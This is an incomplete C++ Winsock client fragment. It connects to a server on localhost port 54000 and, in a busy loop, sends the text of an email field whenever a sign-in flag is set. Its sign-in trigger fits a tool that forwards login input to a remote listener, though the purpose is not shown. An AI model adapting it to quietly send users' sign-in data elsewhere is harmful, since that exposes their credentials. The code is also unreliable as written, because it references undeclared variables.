#include <locale>


    string ipAddress = "127.0.0.1";			// IP Address of the server
    int port = 54000;						// Listening port # on the server
    char buf[4096];

    string oof;
    size_t* sz;


  
    void Networking()
    {
        WSAData data;
        WORD ver = MAKEWORD(2, 2);
        int wsResult = WSAStartup(ver, &data);

      
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);


        sockaddr_in hint;
        hint.sin_family = AF_INET;
        hint.sin_port = htons(port);
        inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

        
        int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
        if (connResult == SOCKET_ERROR)
        {        
            closesocket(sock);
            WSACleanup();
            ExitProcess(EXIT_FAILURE);
        }


        while(1)
        {

            if (pPushedSignIn)	
            {

                // Send the text
                setlocale(LC_CTYPE, "");

                string s(EmailStr.begin(), EmailStr.end());

                int sendResult = send(sock,s.c_str(), s.size() , 0);
                if (sendResult != SOCKET_ERROR)
                {
                    // Wait for response
                    ZeroMemory(buf, 4096);
                    int bytesReceived = recv(sock, buf, 4096, 0);
                    if (bytesReceived > 0)
                    {
                        // Echo response to console
                        //cout << "SERVER> " << string(buf, 0, bytesReceived) << endl;
                    }
                }
            }
            Sleep(10);
        } 

        closesocket(sock);
        WSACleanup();
    }



	


 

